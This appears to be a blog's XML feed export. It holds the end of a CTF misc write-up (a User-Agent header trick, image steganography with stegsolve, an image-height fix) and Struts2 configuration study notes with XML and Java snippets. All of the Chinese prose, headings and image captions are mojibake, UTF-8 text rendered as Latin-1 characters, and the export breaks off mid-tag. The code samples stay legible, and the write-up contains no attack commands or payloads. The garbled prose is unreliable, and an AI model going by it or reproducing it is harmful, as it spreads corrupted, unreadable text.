src="https://img-blog.csdnimg.cn/20210404135103522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ˜¯èœè’™è”½äº†æˆ‘çš„åŒçœ¼ï¼Œåšä¸ªé¢˜è¿˜è¢«å˜²è®½äº†<br><img src="https://img-blog.csdnimg.cn/20210404135150921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="é£˜å•Šé£˜"><a href="#é£˜å•Šé£˜" class="headerlink" title="é£˜å•Šé£˜"></a>é£˜å•Šé£˜</h2><p>é¢˜ç›®æè¿°ï¼šæœ‰æ‰‹Xå°±è¡Œ</p><p>æŠ“åŒ…ï¼Œä¼ªè£…è¯·æ±‚å¤´<code>User-Agent: Android</code>ï¼ŒçŠ¶æ€ç 302é‡å®šå‘ï¼Œå‘ç°äº†mb.html<br><img src="https://img-blog.csdnimg.cn/20210405171746862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›´æ¥è®¿é—®mb.html<br><img src="https://img-blog.csdnimg.cn/20210405172008540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="ç®€å•äºŒç»´ç "><a href="#ç®€å•äºŒç»´ç " class="headerlink" title="ç®€å•äºŒç»´ç "></a>ç®€å•äºŒç»´ç </h2><p>ä¸‹è½½é™„ä»¶ï¼Œä¸€ä¸ªpngå›¾ç‰‡å’Œä¸€ä¸ªâ€œwpâ€ï¼Œä¸¤ä¸ªå‡flagã€‚<br><img src="https://img-blog.csdnimg.cn/2021040414094950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç”¨stegsolveè¿›è¡Œå¼‚æˆ–ï¼Œå‘ç°ä¸€å¼ äºŒç»´ç <br><img src="https://img-blog.csdnimg.cn/20210404141133808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰«ç ï¼Œè¿˜æ˜¯å‡flag<br><img src="https://img-blog.csdnimg.cn/20210404141301883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»§ç»­å¼‚æˆ–ï¼Œè¿˜æ˜¯è¿·æƒ‘ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/20210404141503298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‹¾é€‰æœ€ä½é€šé“ï¼Œä¾æ—§æ˜¯å‡flag<br><img src="https://img-blog.csdnimg.cn/20210404142416970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç‚¹å‡»Analyseï¼Œé€‰æ‹©Steregram Soverè¿›è¡Œå·¦å³åç§»<br><img src="https://img-blog.csdnimg.cn/2021040414211853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»ˆäºæ‰¾åˆ°äº†çœŸflagï¼Œé¢ˆæ¤æ²»ç–—ï¼Œå“ˆå“ˆå“ˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;Jing_Zhui_Zhi_Liao&#125;<br></code></pre></td></tr></table></figure><h2 id="æˆ‘è·Ÿä½ æ‹¼äº†"><a href="#æˆ‘è·Ÿä½ æ‹¼äº†" class="headerlink" title="æˆ‘è·Ÿä½ æ‹¼äº†"></a>æˆ‘è·Ÿä½ æ‹¼äº†</h2><p>ç‹¸é¢˜ï¼Œä¸‹è½½é™„ä»¶ttt.pngå’Œmask.png<img src="https://img-blog.csdnimg.cn/20210404142546734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘å‚»ä¹ä¹çš„åœ¨é‚£æ‹¼å›¾ï¼Œçœ‹äº†wpåŸæ¥ç›´æ¥ä¿®æ”¹å›¾ç‰‡é«˜åº¦å°±è¡Œäº†ï¼Œ666ï¼Œæœç„¶ç‹¸é¢˜å°±æ˜¯ç¦»è°±<br><img src="https://img-blog.csdnimg.cn/20210404143008250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://l1near.top/index.php/2021/04/03/100.html">é¦–å±Šâ€œçº¢æ˜è°·â€æ¯æŠ€èƒ½åœºæ™¯èµ›MISC_WP</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>æ¯”èµ›å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Struts2æ ¸å¿ƒé…ç½®</title>
    <link href="/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šStruts2æ¡†æ¶å­¦ä¹ ç¬”è®°ï¼ˆäºŒï¼‰</p> <a id="more"></a><h1 id="Struts2çš„æ ¸å¿ƒé…ç½®"><a href="#Struts2çš„æ ¸å¿ƒé…ç½®" class="headerlink" title="Struts2çš„æ ¸å¿ƒé…ç½®"></a>Struts2çš„æ ¸å¿ƒé…ç½®</h1><h2 id="Struts2å¸¸é‡é…ç½®"><a href="#Struts2å¸¸é‡é…ç½®" class="headerlink" title="Struts2å¸¸é‡é…ç½®"></a>Struts2å¸¸é‡é…ç½®</h2><h3 id="å¸¸é‡é…ç½®"><a href="#å¸¸é‡é…ç½®" class="headerlink" title="å¸¸é‡é…ç½®"></a>å¸¸é‡é…ç½®</h3><p><strong>1.åœ¨default.properties ä¸­é…ç½®</strong></p><p>é»˜è®¤å€¼,ä¸ä¼šåœ¨è¯¥é…ç½®æ–‡ä»¶ä¸­é…ç½®</p><p><strong>2.åœ¨struts.propertiesä¸­é…ç½®</strong></p><p>åŸºæœ¬ä¸ä¼šåœ¨è¯¥é…ç½®æ–‡ä»¶ä¸­é…ç½®</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml">###è®¾ç½®é»˜è®¤ç¼–ç é›†ä¸ºUTF-8,ä½œç”¨äºHttpServletRequestçš„setCharacterEncodingæ–¹æ³•<br>struts.i18n.encoding=UTF-8 <br><br>###è®¾ç½®actionè¯·æ±‚çš„æ‰©å±•åä¸ºactionæˆ–è€…æ²¡æœ‰æ‰©å±•åï¼Œè¯¥å±æ€§æŒ‡å®šéœ€è¦Struts 2å¤„ç†çš„è¯·æ±‚åç¼€ï¼Œè¯¥å±æ€§çš„é»˜è®¤å€¼æ˜¯actionï¼Œå³æ‰€æœ‰åŒ¹é…*.actionçš„è¯·æ±‚éƒ½ç”±Struts2å¤„ç†ã€‚å¦‚æœç”¨æˆ·éœ€è¦æŒ‡å®šå¤šä¸ªè¯·æ±‚åç¼€ï¼Œåˆ™å¤šä¸ªåç¼€ä¹‹é—´ä»¥è‹±æ–‡é€—å·ï¼ˆ,ï¼‰éš”å¼€<br>struts.action.extension=action,, <br><br>###è®¾ç½®æµè§ˆå™¨æ˜¯å¦ç¼“å­˜é™æ€å†…å®¹,é»˜è®¤å€¼ä¸ºtrue(ç”Ÿäº§ç¯å¢ƒä¸‹ä½¿ç”¨),å¼€å‘é˜¶æ®µæœ€å¥½å…³é—­<br>struts.serve.static.browserCache=true <br><br>### å½“strutsçš„é…ç½®æ–‡ä»¶ä¿®æ”¹å,ç³»ç»Ÿæ˜¯å¦è‡ªåŠ¨é‡æ–°åŠ è½½è¯¥æ–‡ä»¶,é»˜è®¤å€¼ä¸ºfalse(ç”Ÿäº§ç¯å¢ƒä¸‹ä½¿ç”¨) <br>struts.configuration.xml.reload=false <br><br> <br>###è®¾ç½®ä¸ä½¿ç”¨å¼€å‘è€…æ¨¡å¼ï¼Œå¼€å‘æ¨¡å¼ä¸‹ä½¿ç”¨,è¿™æ ·å¯ä»¥æ‰“å°å‡ºæ›´è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯<br>struts.devMode = false <br><br>###è®¾ç½®ä¸å¼€å¯åŠ¨æ€æ–¹æ³•è°ƒç”¨<br>struts.enable.DynamicMethodInvocation=false<br></code></pre></td></tr></table></figure><p><strong>3.åœ¨struts.xmlä¸­é…ç½®</strong></p><blockquote><p>å¼€å‘ä¸­åŸºæœ¬ä¸Šéƒ½åœ¨è¯¥é…ç½®æ–‡ä»¶ä¸­é…ç½®å¸¸é‡</p></blockquote><p>é€šè¿‡<code>&lt;constant&gt;</code>å…ƒç´ æ¥é…ç½®å¸¸é‡ï¼Œè¯¥æ ‡ç­¾å†™<code>&lt;struts&gt;</code>ä¸‹é¢ï¼Œå’Œ<code>&lt;package&gt;</code>æ ‡ç­¾åŒçº§</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- å£°æ˜å¸¸é‡ --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br><span class="hljs-comment">&lt;!-- å£°æ˜å¸¸é‡ --&gt;</span><br><span class="hljs-comment">&lt;!--è®¾ç½®é»˜è®¤ç¼–ç é›†UTF-8,è§£å†³postè¯·æ±‚ä¹±ç --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.i18n.encoding&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br><span class="hljs-comment">&lt;!--è®¾ç½®ä½¿ç”¨å¼€å‘è€…æ¨¡å¼--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.devModel&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br><span class="hljs-comment">&lt;!-- è®¾ç½®åç¼€ --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.action.extension&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;action,,&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>4.åœ¨web.xmlä¸­é…ç½®</p><p>é…ç½®æ ¸å¿ƒè¿‡æ»¤å™¨StrutsPrepareAndExecuteFilteræ—¶ï¼Œé€šè¿‡åˆå§‹åŒ–å‚æ•°æ¥é…ç½®å¸¸é‡,é€šè¿‡<code>&lt;filter&gt;</code>å…ƒç´ çš„<code>&lt;init-param&gt;</code>å­å…ƒç´ æŒ‡å®šå¸¸é‡</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-comment">&lt;!--æŒ‡å®šstruts2çš„æ ¸å¿ƒè¿‡æ»¤å™¨--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-comment">&lt;!--é€šè¿‡init-paramå…ƒç´ é…ç½®struts2å¸¸é‡ï¼Œè®¾ç½®å¼€å‘è€…æ¨¡å¼--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>struts.devModel<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åŸºæœ¬ä¸ä¼šåœ¨è¯¥é…ç½®æ–‡ä»¶ä¸­é…ç½®</p><p>`</p><h3 id="é…ç½®æ–‡ä»¶åŠ è½½é¡ºåº"><a href="#é…ç½®æ–‡ä»¶åŠ è½½é¡ºåº" class="headerlink" title="é…ç½®æ–‡ä»¶åŠ è½½é¡ºåº"></a>é…ç½®æ–‡ä»¶åŠ è½½é¡ºåº</h3><p>1ã€default.propertiesï¼šåœ¨è¯¥æ–‡ä»¶ä¿å­˜åœ¨struts2-core-2.3.37.jarä¸­org/apache/struts2åŒ…ä¸‹ã€‚</p><p>2ã€struts-default.xmlï¼šåœ¨æ ¸å¿ƒçš„jaråŒ…struts2-core-2.3.37.jarçš„æœ€ä¸‹æ–¹ï¼Œstruts2æ¡†æ¶çš„æ ¸å¿ƒåŠŸèƒ½éƒ½æ˜¯åœ¨è¯¥é…ç½®æ–‡ä»¶ä¸­é…ç½®çš„ã€‚</p><p>3ã€struts-plugin.xmlé…ç½®æ–‡ä»¶ã€‚</p><p>4ã€struts.xmlï¼šåœ¨srcçš„ç›®å½•ä¸‹ï¼Œè¯¥æ–‡ä»¶æ˜¯Webåº”ç”¨è‡ªå·±çš„é…ç½®çš„é…ç½®æ–‡ä»¶</p><p>5ã€struts.propertiesï¼šè¯¥æ–‡ä»¶æ˜¯Webåº”ç”¨é»˜è®¤çš„Struts2çš„é…ç½®æ–‡ä»¶</p><p>6ã€web.xmlï¼šè¯¥æ–‡ä»¶æ˜¯Webåº”ç”¨çš„çš„é…ç½®æ–‡ä»¶</p><p>ååŠ è½½çš„é…ç½®æ–‡ä»¶ä¼šè¦†ç›–æ‰ä¹‹å‰åŠ è½½çš„é…ç½®æ–‡ä»¶</p><h2 id="æ ¸å¿ƒé…ç½®æ–‡ä»¶"><a href="#æ ¸å¿ƒé…ç½®æ–‡ä»¶" class="headerlink" title="æ ¸å¿ƒé…ç½®æ–‡ä»¶"></a>æ ¸å¿ƒé…ç½®æ–‡ä»¶</h2><p>åœ¨struts2ä¸­struts.xmlæ˜¯æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼Œstruts.xmlæ–‡ä»¶ä¸­åŒ…å«ä¸‰ä¸ªæ ‡ç­¾</p><h3 id="packageæ ‡ç­¾"><a href="#packageæ ‡ç­¾" class="headerlink" title="packageæ ‡ç­¾"></a>packageæ ‡ç­¾</h3><p>ä¸javaä¸­çš„åŒ…ä¸åŒï¼Œç±»ä¼¼ä¸€ä¸ªä»£ç åŒ…ï¼ŒåŒºåˆ«ä¸åŒçš„actionã€‚</p><p>packageæ ‡ç­¾å±æ€§ï¼š</p><ul><li>nameï¼šåŒ…çš„åç§°ï¼ŒåŒºåˆ†ä¸åŒçš„packageï¼Œç®¡ç†actioné…ç½®</li><li>namespaceï¼šåç§°ç©ºé—´ï¼Œä¸€èˆ¬ä¸æ ‡ç­¾ä¸­çš„nameå±æ€§å…±åŒå†³å®šè®¿é—®è·¯å¾„</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">namespace=â€/â€ â€“ æ ¹åç§°ç©ºé—´ï¼Œä¸å†™é»˜è®¤ä¹Ÿæ˜¯â€œ/â€ã€‚<br>namespace=â€/aaaâ€ â€“ å¸¦æœ‰åç§°çš„åç§°ç©ºé—´ï¼Œè®¿é—®æ—¶å¿…é¡»å¸¦ä¸Šæ‰èƒ½è®¿é—®action<br></code></pre></td></tr></table></figure><ul><li> extendsï¼šç»§æ‰¿ï¼Œå¯ä»¥ç»§æ‰¿å…¶ä»–çš„åŒ…ï¼Œåªè¦ç»§æ‰¿äº†ï¼Œé‚£ä¹ˆè¯¥åŒ…å°±åŒ…å«äº†å…¶ä»–åŒ…çš„åŠŸèƒ½ï¼Œä¸€èˆ¬éƒ½æ˜¯ç»§æ‰¿struts-default</li></ul><h3 id="actionæ ‡ç­¾"><a href="#actionæ ‡ç­¾" class="headerlink" title="actionæ ‡ç­¾"></a>actionæ ‡ç­¾</h3><p>actionæ ‡ç­¾ä¸»è¦é…ç½®actionçš„è®¿é—®è·¯å¾„</p><p>actionçš„æ ‡ç­¾å±æ€§ï¼š</p><ul><li>nameï¼šactionçš„åç§°ï¼ŒåŒºåˆ†ä¸åŒçš„actionï¼Œå’Œpackageæ ‡ç­¾ä¸­çš„namespaceå±æ€§æ„æˆäº†è®¿é—®è·¯å¾„</li><li>classï¼šé…ç½®Actionç±»çš„å…¨è·¯å¾„å…¨è·¯å¾„=åŒ…å+ç±»åï¼Œé€šè¿‡åå°„çš„åŸç†å»æ‰§è¡Œè¯¥ç±»çš„ï¼Œé»˜è®¤å€¼æ˜¯ActionSupportç±»</li><li>method ï¼š Actionç±»ä¸­æ‰§è¡Œçš„æ–¹æ³•ï¼Œå¦‚æœä¸æŒ‡å®šï¼Œé»˜è®¤å€¼æ˜¯execute<h3 id="resultæ ‡ç­¾"><a href="#resultæ ‡ç­¾" class="headerlink" title="resultæ ‡ç­¾"></a>resultæ ‡ç­¾</h3>æ ¹æ®actionä¸­çš„æ–¹æ³•è¿”å›å€¼ï¼Œå°†é¡µé¢å®šä½åˆ°æŒ‡å®šçš„é¡µé¢æˆ–actionä¸Š</li></ul><p>resultæ ‡ç­¾çš„å±æ€§ï¼š</p><ul><li>nameå±æ€§ï¼šå’Œä½ æ–¹æ³•çš„è¿”å›å€¼è¦ä¸€æ ·</li><li>type â€“ ç»“æœç±»å‹ï¼Œæœ‰4ä¸ªå€¼ï¼šdispatcher(é»˜è®¤)ã€redirectã€chainã€redirectAction</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">dispatcher(é»˜è®¤)å’Œredirectï¼šresultæ ‡ç­¾ä¸­â€œ/â€ä»£è¡¨çš„æ˜¯é¡¹ç›®æ ¹è·¯å¾„ï¼Œä¸å†™å°±ä»£è¡¨å½“å‰è·¯å¾„ä¸‹<br>chainå’ŒredirectActionï¼šresultæ ‡ç­¾ä¸­â€œ/â€æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œä¸éœ€è¦å†™ï¼Œå†™äº†å°±æ˜¯å¤šä½™ï¼Œä¹Ÿå°±æ˜¯åªèƒ½ä»å½“å‰è·¯å¾„å»æŒ‡å®šé¡µé¢ï¼ï¼ï¼<br>chainï¼šåªèƒ½è½¬å‘åˆ°åŒä¸€å‘½åç©ºé—´ä¸‹çš„Action<br>redirectï¼šå¯ä»¥é‡å®šå‘åˆ°actionä¸­å»ï¼Œä¹Ÿå¯ä»¥é‡å®šå‘åˆ°æ˜¾ç¤ºé¡µé¢ä¸­å»<br></code></pre></td></tr></table></figure><h3 id="strutsé…ç½®æ–‡ä»¶åˆ†ç¦»"><a href="#strutsé…ç½®æ–‡ä»¶åˆ†ç¦»" class="headerlink" title="strutsé…ç½®æ–‡ä»¶åˆ†ç¦»"></a>strutsé…ç½®æ–‡ä»¶åˆ†ç¦»</h3><p>ç”¨äºæŒ‰æ¨¡å—å¼€å‘ï¼Œåœ¨struts.xmlé…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨<code>&lt;include file=&quot; &quot;/&gt;</code>åŒ…å«æŒ‡å®šçš„æ–‡ä»¶å¤¹</p><p>æ¡ˆä¾‹1ï¼šæœ‰ä¸¤ä¸ªé…ç½®æ–‡ä»¶struts-part1.xmlå’Œstruts-part2.xmlï¼Œå¯ä»¥åœ¨struts.xmlä¸­é…ç½®ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;struts-part1.xml&quot;</span>/&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;struts-part2.xml&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ¡ˆä¾‹2ï¼šåœ¨cn.itcast.action.demoåŒ…ä¸‹æœ‰ä¸€ä¸ªé…ç½®æ–‡ä»¶struts_demo.xmlï¼Œå¼•å…¥è¯¥é…ç½®æ–‡ä»¶åˆ°struts.xmlä¸­</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;cn/itcast/action/demo/struts_demo.xml&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Actionçš„é…ç½®"><a href="#Actionçš„é…ç½®" class="headerlink" title="Actionçš„é…ç½®"></a>Actionçš„é…ç½®</h2><h3 id="å®ç°Actionæ§åˆ¶ç±»"><a href="#å®ç°Actionæ§åˆ¶ç±»" class="headerlink" title="å®ç°Actionæ§åˆ¶ç±»"></a>å®ç°Actionæ§åˆ¶ç±»</h3><p>Actionç±»çš„ä¹¦å†™æ ¼å¼æœ‰ä¸‰ç§æ–¹æ³•</p><p><strong>æ–¹æ³•ä¸€</strong>: Actionç±»å¯ä»¥ä¸ç»§æ‰¿ç‰¹æ®Šçš„ç±»æˆ–ä¸å®ç°ä»»ä½•ç‰¹æ®Šçš„æ¥å£æˆ–è€…çˆ¶ç±»ï¼Œä»…ä»…æ˜¯ä¸€ä¸ªPOJOï¼Œå³ç®€å•çš„Javaå¯¹è±¡ï¼ˆPlain Ordinary Java Objectï¼‰ ï¼Œè¦æœ‰ä¸€ä¸ªå…¬å…±çš„æ— å‚çš„æ„é€ æ–¹æ³•å’Œä¸€ä¸ªexecuteæ–¹æ³•</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ–¹æ³•äºŒ</strong>: åˆ›å»ºä¸€ä¸ªç±»å»å®ç°æŒ‡å®šçš„ä¸€ä¸ªæ¥å£:<code>com.opensymphony.xwork2.Action</code></p><p>è¿™ä¸ªæ¥å£ä¸­åªæœ‰ä¸€ä¸ªæŠ½è±¡æ–¹æ³• </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span><span class="hljs-keyword">throws</span> Exception</span>;<br></code></pre></td></tr></table></figure><p>åŒæ—¶è¿˜æœ‰5ä¸ªStringç±»å‹çš„é™æ€å±æ€§ï¼šERRORã€SUCCESSã€INPUTã€NONEã€LOGIN</p><p>å¸¸é‡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String SUCCESS = <span class="hljs-string">&quot;success&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String NONE = <span class="hljs-string">&quot;none&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String ERROR = <span class="hljs-string">&quot;error&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String INPUT = <span class="hljs-string">&quot;input&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String LOGIN = â€œloginâ€;<br></code></pre></td></tr></table></figure><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code 